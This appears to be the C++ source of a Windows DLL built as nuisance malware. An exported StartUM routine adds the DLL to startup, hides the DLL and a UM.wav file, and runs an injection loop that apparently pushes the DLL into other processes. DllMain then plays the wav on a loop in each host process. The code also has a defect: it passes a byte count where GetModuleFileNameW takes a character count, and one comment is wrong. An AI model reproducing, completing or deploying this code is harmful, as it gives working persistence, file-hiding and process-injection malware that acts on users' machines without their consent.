#include"UM.h"

wchar_t* GetCurrentDllPath() {
    HMODULE hModule = NULL;

    // Get handle of the module (the DLL) from the address of this function
    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | 
                          GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                          (LPCWSTR)GetCurrentDllPath, &hModule)) {
        wchar_t* path = (wchar_t*)malloc(MAX_PATH * sizeof(wchar_t));
        // Retrieve the full path of the module
        if (GetModuleFileNameW(hModule, path, MAX_PATH * sizeof(wchar_t)) != 0) {
            return path; // Return as std::string
        }
    }
    return 0;
}



extern "C" __declspec(dllexport) void StartUM(){
    wchar_t* dllPath = GetCurrentDllPath();
    wchar_t dllFolder[MAX_PATH];
    wchar_t UMPath[MAX_PATH];
    StrCpyNW(dllFolder, dllPath, MAX_PATH);
    PathRemoveFileSpecW(dllFolder);
    writeFolder(dllFolder);
    StrCpyNW(UMPath, dllFolder, MAX_PATH);
    StrCatW(UMPath, L"\\UM.wav");
    AddDllToStartup(dllPath);
    HideDllFile(dllPath);
    HideDllFile(UMPath);
    injectionLoop(dllPath);
}

DWORD WINAPI StartFunction(LPVOID lpParam){
    wchar_t UMPath[MAX_PATH];
    StrCpyNW(UMPath, getFolder(), MAX_PATH);
    StrCatW(UMPath, L"\\UM.wav");
    PlaySoundW(UMPath, NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
    return 0;
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH: {
           
            if(!isRundll32()){
                CreateThread(NULL, 0, StartFunction, NULL, 0, NULL);
            }
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}